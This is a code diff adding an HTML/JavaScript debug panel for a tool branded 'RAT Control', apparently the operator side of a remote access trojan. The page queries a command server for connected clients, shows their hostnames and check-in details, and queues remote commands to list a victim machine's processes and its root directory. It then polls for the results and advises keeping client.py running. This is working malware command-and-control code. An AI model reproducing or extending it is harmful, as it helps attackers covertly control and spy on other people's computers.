@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Debug Panel</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='dashboard.css') }}">
+    <style>
+        .debug-console {
+            background: #1a1a2e;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        
+        .log-entry {
+            padding: 8px;
+            margin-bottom: 5px;
+            border-left: 3px solid #667eea;
+            background: #252540;
+            border-radius: 5px;
+        }
+        
+        .log-success {
+            border-left-color: #00ff88;
+        }
+        
+        .log-error {
+            border-left-color: #ff4757;
+        }
+        
+        .test-section {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .test-btn {
+            margin: 10px 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo">
+            <h2>🎯 RAT Control</h2>
+        </div>
+        <nav class="nav-menu">
+            <a href="/admin/dashboard" class="nav-item">
+                <span class="icon">🏠</span>
+                <span>Dashboard</span>
+            </a>
+        </nav>
+    </div>
+
+    <div class="main-content">
+        <header>
+            <h1>🐛 Debug Panel</h1>
+            <div class="header-actions">
+                <button class="btn btn-primary" onclick="clearLogs()">🗑️ Clear</button>
+                <a href="/admin/dashboard" class="btn btn-primary">⬅️ Back</a>
+            </div>
+        </header>
+
+        <div class="test-section">
+            <h2>Test Client: {{ client_id[:16] }}...</h2>
+            <p><strong>Status:</strong> <span class="status-{{ 'online' if is_online else 'offline' }}">{{ '🟢 Online' if is_online else '🔴 Offline' }}</span></p>
+            <hr style="margin: 20px 0; border-color: #2a2a3e;">
+            
+            <h3>Quick Tests</h3>
+            <button class="btn btn-primary test-btn" onclick="testServerConnection()">1️⃣ Test Server Connection</button>
+            <button class="btn btn-primary test-btn" onclick="testClientStatus()">2️⃣ Test Client Status</button>
+            <button class="btn btn-primary test-btn" onclick="testProcessCommand()">3️⃣ Test Process Command</button>
+            <button class="btn btn-primary test-btn" onclick="testFileCommand()">4️⃣ Test File Command</button>
+            <button class="btn btn-primary test-btn" onclick="testFullFlow()">5️⃣ Test Full Flow</button>
+        </div>
+
+        <div class="debug-console" id="debugConsole">
+            <div class="log-entry">Debug console ready. Click a test button above...</div>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='main.js') }}"></script>
+    <script>
+        const clientId = '{{ client_id }}';
+        
+        function log(message, type = 'info') {
+            const console = document.getElementById('debugConsole');
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${type}`;
+            entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            console.appendChild(entry);
+            console.scrollTop = console.scrollHeight;
+        }
+
+        function clearLogs() {
+            document.getElementById('debugConsole').innerHTML = '<div class="log-entry">Console cleared.</div>';
+        }
+
+        async function testServerConnection() {
+            log('Testing server connection...', 'info');
+            try {
+                const response = await fetch('/admin/status');
+                const data = await response.json();
+                log(`✅ Server is online! Total clients: ${data.total_clients}, Online: ${data.online_clients}`, 'success');
+                log(`Server uptime: ${Math.floor(data.uptime_seconds)}s`, 'success');
+                return true;
+            } catch (error) {
+                log(`❌ Server connection failed: ${error.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function testClientStatus() {
+            log('Checking client status...', 'info');
+            try {
+                const response = await fetch('/admin/clients');
+                const data = await response.json();
+                
+                const client = data.clients.find(c => c.client_id === clientId);
+                if (client) {
+                    log(`✅ Client found! Hostname: ${client.system_info.hostname}`, 'success');
+                    log(`Online: ${client.online ? 'Yes 🟢' : 'No 🔴'}`, client.online ? 'success' : 'error');
+                    log(`Last seen: ${new Date(client.last_seen * 1000).toLocaleString()}`, 'info');
+                    log(`Check-ins: ${client.checkin_count}`, 'info');
+                    return true;
+                } else {
+                    log(`❌ Client ${clientId} not found in connected clients!`, 'error');
+                    return false;
+                }
+            } catch (error) {
+                log(`❌ Failed to get clients: ${error.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function testProcessCommand() {
+            log('Testing process command queue...', 'info');
+            try {
+                const response = await fetch(`/admin/process/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'list_processes',
+                        data: {}
+                    })
+                });
+                
+                const data = await response.json();
+                log(`Response status: ${response.status}`, 'info');
+                log(`Response: ${JSON.stringify(data)}`, 'info');
+                
+                if (data.success) {
+                    log(`✅ Command queued successfully! Command ID: ${data.command_id}`, 'success');
+                    
+                    // Wait and check for result
+                    log('Waiting 3 seconds for result...', 'info');
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                    
+                    const resultResponse = await fetch(`/admin/command_result/${data.command_id}`);
+                    const resultData = await resultResponse.json();
+                    
+                    log(`Result response: ${JSON.stringify(resultData)}`, 'info');
+                    
+                    if (resultData.success && resultData.result) {
+                        log(`✅ Got result! Processes count: ${resultData.result.length || 'N/A'}`, 'success');
+                        return true;
+                    } else {
+                        log(`⚠️ Result not ready yet or no data. This is normal if client is offline.`, 'error');
+                        return false;
+                    }
+                } else {
+                    log(`❌ Failed to queue command: ${data.message || 'Unknown error'}`, 'error');
+                    return false;
+                }
+            } catch (error) {
+                log(`❌ Error: ${error.message}`, 'error');
+                log(`Stack: ${error.stack}`, 'error');
+                return false;
+            }
+        }
+
+        async function testFileCommand() {
+            log('Testing file command queue...', 'info');
+            try {
+                const response = await fetch(`/admin/file/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'list_directory',
+                        data: {path: '/'}
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    log(`✅ File command queued! Command ID: ${data.command_id}`, 'success');
+                    return true;
+                } else {
+                    log(`❌ Failed to queue file command`, 'error');
+                    return false;
+                }
+            } catch (error) {
+                log(`❌ Error: ${error.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function testFullFlow() {
+            log('=== Starting Full Test Flow ===', 'info');
+            
+            const test1 = await testServerConnection();
+            if (!test1) {
+                log('❌ Server connection failed. Stopping tests.', 'error');
+                return;
+            }
+            
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            const test2 = await testClientStatus();
+            if (!test2) {
+                log('⚠️ Client not found or offline. Commands may not work.', 'error');
+            }
+            
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            const test3 = await testProcessCommand();
+            
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            const test4 = await testFileCommand();
+            
+            log('=== Test Flow Complete ===', 'info');
+            
+            if (test1 && test2 && test3 && test4) {
+                log('🎉 All tests passed!', 'success');
+            } else {
+                log('⚠️ Some tests failed. Check the logs above.', 'error');
+                
+                if (!test2) {
+                    log('💡 TIP: Make sure the client is running and connected to the server.', 'info');
+                }
+                
+                if (!test3 || !test4) {
+                    log('💡 TIP: The client needs to be online and polling for commands.', 'info');
+                    log('💡 TIP: Check if the client is running client.py and connected.', 'info');
+                }
+            }
+        }
+    </script>
+</body>
+</html>
